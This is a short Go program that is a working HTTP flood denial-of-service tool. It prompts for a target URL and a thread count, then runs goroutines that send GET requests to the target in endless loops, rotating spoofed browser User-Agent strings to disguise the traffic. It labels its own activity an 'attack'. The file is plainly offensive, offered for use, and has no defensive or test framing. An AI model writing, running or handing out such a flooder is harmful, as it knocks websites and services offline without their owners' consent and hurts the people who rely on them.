package main


import (
	"fmt"
	"net/http"
	"math/rand"
	"os"
	"os/signal"
	"strings"
	"syscall"

)

func genUserAGent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:41.0) Gecko/20100101 Firefox/41.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0",
	}
	return agents[rand.Intn(len(agents))]
}

func sendReq(target string) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		fmt.Println("[-] Error creating request:", err)
		return
	}

	req.Header.Set("User-Agent", genUserAGent())
	req.Header.Set("Connection", "keep-alive")

	_,err = client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error sending GET request to %s: %v\n", target,err)

	} else {
		fmt.Printf("[+] Sent GET request to %s\n", target)
	}
}

func attack(target string, threads int){
	for i:= 0; i< threads;i++ {
		go func ()  {
			for {
				sendReq(target)
			}
		}()
	}
}

func main() {
	var target string
	var threads int

	fmt.Print("Enter Target URL: ")
	fmt.Scanln(&target)

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://"){
		fmt.Println("[-] Invalid URL format.")
		os.Exit(1)
	}
	fmt.Print("Enter Number of threads: ")
	fmt.Scanln(&threads)

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	go attack(target, threads)
	<-stop
	fmt.Println("\n[+] Stopping attack....")
}